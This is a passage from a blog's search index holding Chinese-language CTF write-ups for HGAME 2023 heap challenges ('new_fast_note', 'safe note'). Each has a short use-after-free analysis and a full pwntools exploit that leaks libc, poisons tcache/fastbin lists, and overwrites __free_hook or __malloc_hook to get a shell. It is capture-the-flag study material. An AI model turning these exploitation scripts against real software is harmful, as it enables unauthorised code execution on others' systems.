punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/starrysky/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete中free之后未清零造成uaf漏洞</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，再add一个进入unsorted bin，利用uaf漏洞showunsorted bin中的chunk，泄露libc地址并计算free_hook和system</p><p>2.填充tcache大小小于0x90，再add相同大小的chunk，double free之后进入fast bin</p><p>3.申请tcache和fast bin前两个chunk为free_hook，再申请掉fast bin中最后一个chunk，此时该chunk在free_hook地址，将其内容设置为system即可完成任意地址写</p><p>4.申请堆内容为&#x2F;bin&#x2F;sh，再free掉，等同于执行system（&#x2F;bin&#x2F;sh），即可getshell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2023 week3 pwn</title>
      <link href="/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
      <url>/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
